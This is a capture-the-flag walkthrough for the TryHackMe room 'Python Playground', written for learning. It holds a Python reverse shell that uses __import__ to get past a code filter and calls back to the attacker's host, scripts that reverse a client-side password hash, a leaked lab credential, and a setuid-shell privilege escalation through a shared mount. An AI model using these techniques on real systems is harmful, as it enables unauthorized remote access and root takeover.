---
description: A hard level TryHackMe room.
---

# 2 - Python Playground

Difficulty: **Hard level**

[https://tryhackme.com/room/pythonplayground](https://tryhackme.com/room/pythonplayground)

### Flag-1

Nmap enumeration:

```
nmap -sV -sC -p- -T5 ip_addres_after_deploy
```

Nmap found 2 services:

<table><thead><tr><th width="124">Port</th><th>Service</th></tr></thead><tbody><tr><td>22</td><td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>80</td><td>Node.js Express framework</td></tr></tbody></table>

We visit the Node.js web page and was greeted with "_Login_ and _Sign Up"_ redirects which were both dead ends.

Lets enumerate with gobuster.

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://ip-address -w /usr/share/dirb/wordlists/common.txt -t 300
```
{% endcode %}

We found an **admin.html** file.

Admin page ([http://ip-address/admin.html](http://ip-address/admin.html)) welcomes use with login form **Connor's Secret Admin Backdoor**. Which indicate a user "connor".

We examine the html source. The source shows some interesting code:

{% code overflow="wrap" lineNumbers="true" %}
```javascript
   <script>
      // I suck at server side code, luckily I know how to make things secure without it - Connor

      function string_to_int_array(str){
        const intArr = [];

        for(let i=0;i<str.length;i++){
          const charcode = str.charCodeAt(i);

          const partA = Math.floor(charcode / 26);
          const partB = charcode % 26;

          intArr.push(partA);
          intArr.push(partB);
        }

        return intArr;
      }

      function int_array_to_text(int_array){
        let txt = '';

        for(let i=0;i<int_array.length;i++){
          txt += String.fromCharCode(97 + int_array[i]);
        }

        return txt;
      }

      document.forms[0].onsubmit = function (e){
          e.preventDefault();

          if(document.getElementById('username').value !== 'connor'){
            document.getElementById('fail').style.display = '';
            return false;
          }

          const chosenPass = document.getElementById('inputPassword').value;

          const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(chosenPass))));

          if(hash === 'dxeedxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'){
            window.location = 'super-secret-admin-testing-panel.html';
          }else {
            document.getElementById('fail').style.display = '';
          }
          return false;
      }
  </script>
```
{% endcode %}

We can see that on logging in as "connor" we get redirected to the <mark style="color:red;">"window.location = 'super-secret-admin-testing-panel.html';"</mark> page, so we try to navigate there manually and was able to bypass the login, and stumbled on a page that allows for python code execution --> [http://ip-address/super-secret-admin-testing-panel.html](http://ip-address/super-secret-admin-testing-panel.html)&#x20;

Unfortunatelly there is some restrictions. For example **import** statement is restricted. Lets try to bypass this restriction. We can try to use **\_\_import\_\_** statement. Knowing this we can prepare our code, bypass restrictions and get reverse shell with following code:

```python
o = __import__('os')
s = __import__('socket')
p = __import__('subprocess')

k=s.socket(s.AF_INET,s.SOCK_STREAM)
k.connect(("tun0_ip",7345))
o.dup2(k.fileno(),0)
o.dup2(k.fileno(),1)
o.dup2(k.fileno(),2)
c=p.call(["/bin/sh","-i"]);
```

Execute listener:

```
nc -nvlp 7345
```

and run the code from python web console.

We got a shell:

{% code overflow="wrap" %}
```bash
listening on [any] 7345 ...
connect to [10.8.X.X] from (UNKNOWN) [10.10.X.X] 34130
/bin/sh: 0: can't access tty; job control turned off
# cd /root
# ls
app
flag1.txt
# cat flag1.txt
THM{XXXXXXXXXXXXXXXXXXXX}
#
```
{% endcode %}

### Flag-2

In addition to Node.js service there is also SSH. The only information about credentials we have comes from **admin.html** page (username: Connor, hashed password, functions generating password's hash).

{% code overflow="wrap" lineNumbers="true" %}
```javascript
<script>
      // I suck at server side code, luckily I know how to make things secure without it - Connor

      function string_to_int_array(str){
        const intArr = [];

        for(let i=0;i<str.length;i++){
          const charcode = str.charCodeAt(i);

          const partA = Math.floor(charcode / 26);
          const partB = charcode % 26;

          intArr.push(partA);
          intArr.push(partB);
        }

        return intArr;
      }

      function int_array_to_text(int_array){
        let txt = '';

        for(let i=0;i<int_array.length;i++){
          txt += String.fromCharCode(97 + int_array[i]);
        }

        return txt;
      }

      document.forms[0].onsubmit = function (e){
          e.preventDefault();

          if(document.getElementById('username').value !== 'connor'){
            document.getElementById('fail').style.display = '';
            return false;
          }

          const chosenPass = document.getElementById('inputPassword').value;

          const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(chosenPass))));

          if(hash === 'dxeedxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'){
            window.location = 'super-secret-admin-testing-panel.html';
```
{% endcode %}

The hash revert process is required to find Connor's password. Hash is generating by executing two functions, two times each: **string\_to\_int\_array** and **int\_array\_to\_text**.

The hashed password is known: **'dxeedxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'**.

After analyzing mentioned functions our final code for getting Connor's password is:

#### using python to decrypt hash

{% code overflow="wrap" lineNumbers="true" %}
```python
import string
import math

characters = string.digits + string.ascii_lowercase

hashstring = 'dxeedxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'

ord_chars = [ ord(i) for i in hashstring ]


password = [ ord(j) for i in range(1,len(ord_chars),2)
        for j in characters if (ord(j) % 26 + 97) == ord_chars[i]
        and (math.floor(ord(j)/26) + 97) == ord_chars[i-1] ]

password = [ j for i in range(1,len(password),2)
        for j in characters if (ord(j) % 26 + 97) == password[i]
        and (math.floor(ord(j)/26) + 97) == password[i-1] ]

print("Connor's password is: " + ''.join(password))
```
{% endcode %}

#### using javascript to decrypt hash

{% code overflow="wrap" lineNumbers="true" %}
```javascript
function decodeStr(str) {
    let out = ""

    for (let i = 0; i < str.length; i += 2) {
        let partA = str.charCodeAt(i) - 97
        let partB = str.charCodeAt(i + 1) - 97

        out += String.fromCharCode((partA * 26) + partB)
    }

    return out
}

console.log(decodeStr(decodeStr("<REDACTED>"))) // password


--> or <--

let hash = "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"

function reverse(hash,iterations){
  
  if(iterations > 0){
    let reversedHash = ''
    for(let i=0; i < hash.length; i = i+2 ){
      reversedHash += String.fromCharCode(26 * (hash.charCodeAt(i) - 97) + (hash.charCodeAt(i + 1) - 97));
    }    
    return reverse(reversedHash,iterations - 1);
  }else{
    return hash;
  }
  
}
console.log(reverse(hash,2))
```
{% endcode %}

Then connected with <mark style="color:red;">connor:spaghetti1245</mark> using ssh. We find flag2.

### Flag-3

Used linpeas to enumerate the system within the container, it pointed out that there was a mounted directory called `/mnt/log`  the /mnt/log (root shell machine) is linked to /var/log on "connor" machine. A close look shows us that this directory (/mnt/log) contains logs from machine we logged in using Connor's credentials. As we are root on this machine, prepare something for connor to help him get root.

{% code overflow="wrap" lineNumbers="true" %}
```bash
cp /bin/sh /mnt/log
chmod +s /mnt/log/sh
ls -l /mnt/log/sh
# output should be like this..
-rwsr-sr-x 1 root root 129816 Jun 10 14:09 /mnt/log/sh
```
{% endcode %}

Now we need to back to connor's ssh session and execute:

```
connor@pythonplayground:~$ /var/log/sh -p
# cd /root/
# ls
flag3.txt
```

Done.
